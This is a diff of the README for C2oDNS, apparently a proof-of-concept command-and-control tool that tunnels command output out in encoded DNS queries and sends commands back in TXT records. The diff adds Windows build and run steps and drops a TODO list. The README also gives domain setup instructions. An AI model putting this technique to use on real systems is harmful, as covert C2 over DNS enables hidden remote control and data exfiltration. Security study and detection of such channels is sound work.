@@ -1,6 +1,6 @@
 # C2oDNS
 ## Command&Control channel over DNS protocol
-This is PoC of the communication channel implemented over DNS protocol. It utilizes a typical client-server architecture. The client is written in C and for now, is only Linux compatible. The server is a python script. 
+This is PoC of the communication channel implemented over DNS protocol. It utilizes a typical client-server architecture. The client is written in C (Linux and Windows compatible) and the server is written in Python. 
 
 ## Operating principle
 A quick refresher on the DNS protocol: its main goal is to **translate a human-friendly domain name into the IP address**. When a device wants to perform this translation, a DNS query is sent to a recursive DNS server. Thanks to the hierarchical structure of DNS servers, this query can travel across multiple DNS servers until it finds an authoritative server of a domain. And if the answer for our query isn't cached anywhere along the way, the query will always hit the domain's authoritative server. The fun begins when we are in a possession of a domain and configure it in such a way, that the authoritative DNS server for this domain is under our control. Then when somebody asks for the address of our subdomain, **a DNS query is forwarded to our server**. In normal conditions we would just return some IP address, but not this time. That query was prepared by the client application and instead of normal subdomains, **it contains some encoded data** (e.g. result of a command execution). To make things even better, DNS queries can not only ask for IP address (type A) but can also for text information (type TXT) that normally would be used for domain ownership verification, email spam prevention, and many more. We can take advantage of this by **sending commands to clients as TXT records**.
@@ -24,7 +24,7 @@ For every query that hits the server, a proper response is generated (empty data
 ## Setup for educational purposes
 1. Obtain a domain (suppose it's *example.com*)
 2. Obtain a server with public IP address
-3. Cofnigure your domain
+3. Cofnigure the domain
     ```
     Example:
     a.example.com   NS  ns.example.com
@@ -32,7 +32,11 @@ For every query that hits the server, a proper response is generated (empty data
     ```
 4. Compile *client.c* and run **ON YOUR MACHINE**
     ```
-    make && ./client a.example.com client_id
+    make [linux/windows]
+    # Linux:
+    ./client a.example.com client_id
+    # Windows:
+    client.exe a.example.com client_id
     ```
 5. Run *server.py* on your server 
 
@@ -79,10 +83,6 @@ Options:
   --help                   Show this message and exit.
 ```
 ![command-and-control](https://i.imgur.com/8d8sFDt.png)
-
-## TODO
-- Client for Windows
-- Using MAC address as a client ID 
 
 ## Licence
 MIT
